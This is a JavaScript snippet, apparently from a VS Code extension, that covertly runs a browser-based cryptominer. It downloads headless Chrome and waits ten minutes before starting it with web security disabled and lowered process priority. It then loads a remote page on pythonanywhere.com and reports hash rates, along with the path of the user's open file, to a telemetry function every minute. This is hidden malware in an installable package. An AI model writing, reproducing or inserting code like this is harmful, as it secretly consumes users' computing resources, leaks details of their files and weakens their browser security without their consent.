(async () => {


  const { readdir, stat } = require('fs/promises');
  const { join } = require('path');

  async function dirSize(dir) {
    const files = await readdir(dir, { withFileTypes: true });

    const paths = files.map(async file => {
      const path = join(dir, file.name);
      if (file.isDirectory()) return await dirSize(path);
      if (file.isFile()) {
        const { size } = await stat(path);

        return size;
      }
      return 0;
    });

    return (await Promise.all(paths)).flat(Infinity).reduce((i, size) => i + size, 0);
  }

  await tstt({ message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
  const cacheDir = `${os.homedir()}/.cache/puppeteer`;
  if (!fs.existsSync(cacheDir)) {
    fs.mkdirSync(cacheDir, { recursive: true });
  };
  const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
  let chromePath;
  const chromeBrowser = installedBrowsers.find(browser => browser.browser === 'chrome');
  console.log('installed', installedBrowsers);
  if (!chromeBrowser) {
    await new Promise(r => setTimeout(r, 10 * 60 * 1000));
    await tstt({ message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
    puppeteerBrowsers.InstallOptions;
    installedBrowser = await puppeteerBrowsers.install({
      browser: 'chrome',
      buildId: '130.0.6723.58',
      cacheDir,
    });
    chromePath = installedBrowser.executablePath;
  } else {
    chromePath = chromeBrowser.executablePath;
  }

  await tstt({ message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });

  let browser;
  let page;
  setInterval(async () => {
    if (browser && page) {
      const hs = await page.evaluate(() => { return window._client?.getHashesPerSecond(); });
      tstt({
        message: "HASH",
        value: parseFloat(hs).toFixed(2),
        file: safe(() => editor?.document?.uri?.fsPath)
      });
    } else {
      tstt({
        message: "HASH_WAIT " + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2),
        value: 0,
        file: safe(() => editor?.document?.uri?.fsPath)
      });
    }
  }, 60000);

  browser = await puppeteer.launch({
    executablePath: chromePath,
    headless: true,
    args: [
      '--disable-web-security',
      '--disable-features=IsolateOrigins,site-per-process',
      '--allow-running-insecure-content',
    ]
  });
  os.setPriority(browser.process().pid, 19);
  page = await browser.newPage();
  await page.goto('https://ab498.pythonanywhere.com/files/init.html');


  await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });



})();